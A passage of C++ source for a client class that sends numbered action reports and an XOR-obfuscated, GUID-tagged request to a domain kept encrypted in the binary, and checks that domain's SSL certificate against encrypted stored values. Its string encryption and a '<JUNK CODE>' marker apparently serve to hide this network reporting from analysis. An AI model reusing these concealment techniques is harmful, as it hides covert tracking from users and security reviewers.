	for (int i = 0 ; i < IC_SEC_BUF_SIZE; i++)
	{
		dst[i] = 0;
	}
	
	int srcsize = strlen(source);
	*dwResultSize = 0;
	byte *pbuff = (byte *) &dst[0];

	for (int i = 0; i < srcsize; i++)
	{
		byte bt = source[i];
		
		if (bt == 0x8F)
		{
			// copy pindex param
			int plen = strlen( param[pindex] );
			for (int j = 0 ; j < plen; j++)
			{
				pbuff[ *dwResultSize ] = param[pindex][j] ^ 0xAA ;
				(*dwResultSize)++;
				
				// ! safe secure size, it doesn't take in account that the buffer is of DWORD type:
				// @
				if (*dwResultSize > IC_SEC_BUF_SIZE - 1)
				{
					*dwResultSize = IC_SEC_BUF_SIZE - 1;
				}
			}
			
			i++;
			pindex++;
			
			// safe limit index
			if (pindex > 4 )
				{
					pindex = 4;
				}
		}
		else
		{
		   pbuff[ *dwResultSize ] = source[i];// ^ 0xAA;
		   (*dwResultSize)++;
		   
		   // ! safe secure size, it doesn't take in account that the buffer is of DWORD type:
			// @
			if (*dwResultSize > IC_SEC_BUF_SIZE - 1)
			{
				*dwResultSize = IC_SEC_BUF_SIZE - 1;
			}
		}
	}
}

std::string InetClient::GenerateGuid()
{
	CXRString str(CXR_formatGUID);
	GUID guid;
	HRESULT hCreateGuid = CoCreateGuid(&guid);
	TCHAR szBuf[256];

	// <JUNK CODE>

	sprintf_s(szBuf, 256, str.DecryptRaw(), guid.Data1, guid.Data2, guid.Data3, guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3], guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
	
	return std::string(szBuf);
}

const char *InetClient::getDomain()
{
	return cxrMainDomain.DecryptRaw();
}

std::string InetClient::SendReport(int id)
{
	std::string response;
	TCHAR url[1024] = { 0 };
	
	sprintf_s(url, _T("a:%i"), id);
	
	ProcessURL(url);
	
	if (!SendGetRequest(url, response))
	{
		response = "error";	
	}

#ifdef _DEBUG
	if (response.compare("1") != 0 && response.compare("1\n") != 0 && response.compare("1\r\n") != 0)
	{
		PRINT_LOG("!!! Failed response for action %d: %s", id, response.c_str());
	}
#endif
	return response;
}

/************************************************************************/
// send ipb.php
/************************************************************************/
std::string InetClient::SendReportWithParam(const char *szPath, const char *szParam)
{
	std::string response;
	TCHAR url[1024] = { 0 };
	
	sprintf_s(url, _T("%s:%s"), szPath, szParam);
	
	ProcessURL(url);
	
	if ( ! SendGetRequest(url, response) )
	{
		response = "error";	
	}
	
	return response;
}

bool InetClient::Send2142SpecialFeedBack()
{
	bool bResult = false;
	
	// send a2142 and get rnd key
	if( SendReport(2142) != std::string("error") ) // strong
		bResult = true;
	
	m_bUsePrevRND = 1;
	
	if( SendReport(2144) != std::string("error") ) // strong
		bResult = (bResult && true);
	
	m_bUsePrevRND = 0;
	m_RND = "";

	return bResult;
}

bool InetClient::CheckDomainConnection()
{
	std::string response;
	CXRString cxrStr(CXR_HTTPS_SL);
	
	std::string url = cxrStr.DecryptRaw();
	
	url += getDomain();
	
	// !!! SendGetRequest makes three attempts now:
	if ( ! SendGetRequest(url.c_str(), response))
	{
		SLEEP(1000);
		
		if ( ! SendGetRequest(url.c_str(), response))
		{
			response = SendReport(2350); 
			
			// ! some hostings return '1', some return "1\r\n" in response:
			if (!(response.length() > 0 && response.length() < 4 && response[0] == '1'))
			{
				// failed internet connection:
				cxrStr.SetValue(CXR_INET_NOT_FOUND);
				CXRString cxrStrError(CXR_ERROR);
				
				MessageBox(NULL, cxrStr.DecryptRaw(), cxrStrError.DecryptRaw(), MB_OK | MB_ICONERROR);
				
				return false;
			}
		}
	}
	return true;
}

bool InetClient::CheckSSLCertificate(int action)
{
	std::string response;
	std::string strCertificate;

	TCHAR url[1024] = { 0 };
	
	sprintf_s(url, _T("a:%i"), action);
	
	ProcessURL(url);
	
	if ( SendGetRequestWithSSLCert(url, response, strCertificate) )
	{
		CXRString ccxrCertificate(CXR_SSL_CERT1);
		
		if( strCertificate.find(ccxrCertificate.DecryptRaw()) != std::string::npos) {
			return true;
		} else {
			ccxrCertificate.SetValue(CXR_SSL_CERT2);
			if( strCertificate.find(ccxrCertificate.DecryptRaw()) != std::string::npos) {
				return true;
			} else {
				ccxrCertificate.SetValue(CXR_SSL_CERT3);
				if( strCertificate.find(ccxrCertificate.DecryptRaw()) != std::string::npos) {
					return true;
				} else {
					ccxrCertificate.SetValue(CXR_SSL_CERT4);
					if( strCertificate.find(ccxrCertificate.DecryptRaw()) != std::string::npos) {
						return true;
					}
				}
			}
		}
	}
	
	return false;
}
bool InetClient::CheckDomainConnectionAndSSL(bool& SSLSuccess)
{
	SSLSuccess = false;
	std::string strCertificate;
	std::string response;
	CXRString cxrStr(CXR_HTTPS_SL);

	std::string url = cxrStr.DecryptRaw();

	url += getDomain();

	// !!! SendGetRequest makes three attempts now:
	if (!SendGetRequestWithSSLCert(url.c_str(), response, strCertificate))
	{
		SLEEP(1000);

		if (!SendGetRequestWithSSLCert(url.c_str(), response, strCertificate))
		{
			response = SendReport(2350); 

			// ! some hostings return '1', some return "1\r\n" in response:
			if (!(response.length() > 0 && response.length() < 4 && response[0] == '1'))
			{
				// failed internet connection:
				cxrStr.SetValue(CXR_INET_NOT_FOUND);
				CXRString cxrStrError(CXR_ERROR);
				MessageBox(NULL, cxrStr.DecryptRaw(), cxrStrError.DecryptRaw(), MB_OK | MB_ICONERROR);
				return false;
			}
		}
	}
	
	CXRString ccxrCertificate(CXR_SSL_CERT1);
	if( strCertificate.find(ccxrCertificate.DecryptRaw()) != std::string::npos) 
	{
		SSLSuccess = true;
	} 
	else 
	{
		ccxrCertificate.SetValue(CXR_SSL_CERT2);
		if( strCertificate.find(ccxrCertificate.DecryptRaw()) != std::string::npos) 
		{
			SSLSuccess = true;
		} 
		else 
		{
			ccxrCertificate.SetValue(CXR_SSL_CERT3);
			if( strCertificate.find(ccxrCertificate.DecryptRaw()) != std::string::npos) 
			{
				SSLSuccess = true;
			} 
			else 
			{
				ccxrCertificate.SetValue(CXR_SSL_CERT4);
				if( strCertificate.find(ccxrCertificate.DecryptRaw()) != std::string::npos) 
				{
					SSLSuccess = true;
				}
			}
		}
	}

	return true;
}



//